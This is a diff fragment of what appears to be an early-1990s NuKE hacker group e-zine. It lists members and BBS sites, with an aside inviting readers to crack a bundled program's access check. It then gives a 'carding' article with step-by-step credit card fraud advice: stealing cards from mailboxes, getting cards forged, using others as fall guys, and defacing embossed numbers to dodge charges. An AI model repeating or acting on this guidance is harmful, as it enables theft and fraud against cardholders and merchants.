+departure of Dr.Feelgood, we lose Use Your Illusion as a site, but we have
+added on The Hells Pit in 708, definitely a board to call up. The Dark Domain
+has also been revamped and is now NDC. There is also my board (TPR) that is
+the only other site in 514 along with the WHQ, NDC. We have included a small
+program with this release, which contains all NuKE sites and support numbers,
+along with phone numbers and new user passwords if applicable. However, to be
+able to get this information, you must enter a six digit code. The reason for
+this is that we can control a little better who gets the numbers to our
+boards. Now, if the code was not present on the board where you downloaded
+this file, then either ask any NuKE member or sysop, or crack the program and
+bypass the code check. In any case, we don't want any rodents on our boards.
+There has recently been an incident with our 604 site (State Of Euphoria) and
+it's sysop Prince Of Thieves. It seems Prince Of Thieves was the victim of
+some bastards vicious revenge. I will not go into details, but because of
+this, the board seems to be down, and we are limited in contacting both 604
+members. However we will include them in the list since they are still NuKE
+members and will be back when all has calmed down. And to Prince Of Thieves,
+we all say good luck, and this one is dedicated to you. So for now, NuKE
+stands as follows:
+
+ Members:
+
+ - Acid Face --------- 514
+ - Dark Angel -------- 819
+ - Igmaster ---------- 604
+ - Jack Damn --------- 514
+ - Mechanix ---------- 514
+ - Nemesis ----------- 713
+ - Nowhere Man ------- 708
+ - Phrozen Virus ----- 514
+ - Prince Of Thieves - 604
+ - Rock Steady ------- 514
+ - The Darkman ------- 514
+
+ Sites:
+
+ - Nuclear Development Corporation - 514 - The Darkman ----------- WHQ
+ - The Phrozen Realm --------------- 514 - Mechanix -------------- 514 Site
+ - Brain Damage -------------------- 819 - Dark Angel ------------ 819 Site
+ - State Of Euphoria --------------- 604 - Prince Of Thieves ----- 604 Site
+ - Avenging Force ------------------ 713 - Nemesis --------------- 713 Site
+ - The Hells Pit ------------------- 708 - Hades & Kato ---------- 708 Support
+ - Devils Realm -------------------- 408 - Djinii & Night Shade -- 408 Support
+
+ Note: The two 514 boards are operating at low speeds (2.4k) and do not carry
+       any software crap. They are also completely private boards for the sole
+       purpose of hacking/phreaking knowledge. Don't pollute them or any other
+       site with bullshit. - The Sysops
+
+%SCP/NuKE:
+
+    NuKE also has an affiliate group in Australia known as SCP/NuKE (Southern
+Corrupted Programming/NuKE). They are a separate group, but share many of the
+same goals as us, and will be participating in most of our releases, as well
+as releases of their own. They currently stand as follows:
+
+ Members:
+
+ - Phrozen Doberman
+ - Lord Venom
+ - Rigor Mortis
+ - Comhack International
+ - The Assassin
+ - Kick Boxer
+
+ Mî›H’ï!X/ïšKî
+  Mechanix/NuKE
+
+%End of File%
+%^55^%
+Carding Article #2
+Prince Of Thieves
+
+    Ok, in this article I'll discuss using actual cards, forging and modifying
+existing cards..  To use an actual card, you must find one in the mail, or,
+know somebody in the Post Office who'll be willing to give them to you..  It
+really helps to know when Visa/MC/AmEx/etc.. mails out their cards..  Once you
+know that you can do some spot checking in mail boxes.. Once you have your
+card, go and buy a bunch of tapes/clothes/whatever because they are likely to
+check, so, make sure you look old <18-25 at least!> even for the small stuff..
+These aren't that great for getting electronics, but, if you do try
+electronics, be VERY careful!  If you do decide to go for electronics, it's
+always helpful to con a 'friend' that you don't like so much into doing it for
+you, just in case..
+
+    Forging, do not forge your own cards, get someone else to do it, unless of
+course you know what your doing :>..  Get a friend to do it, if you don't know
+a friend that does it, actually pay someone to do it..  This assures that the
+copy will be passable..  Make sure its very good just in case.. Also, it helps
+to put a virgin gold card number on it!! :>..
+
+    If your a legal credit card owner, then, you may still want to make free
+purchases, just get a flat bar that covers all the numbers, and, just simply
+hammer the numbers down, that way it'll only appear on your copy of the
+receipt!  Just to be careful, hammer out your name and such too..
+
+That's all for this carding article, soon there will be another!!
+
+ -PoT
+        -[NuKE][NpA][RiP PreZ]
+
+%End of File%
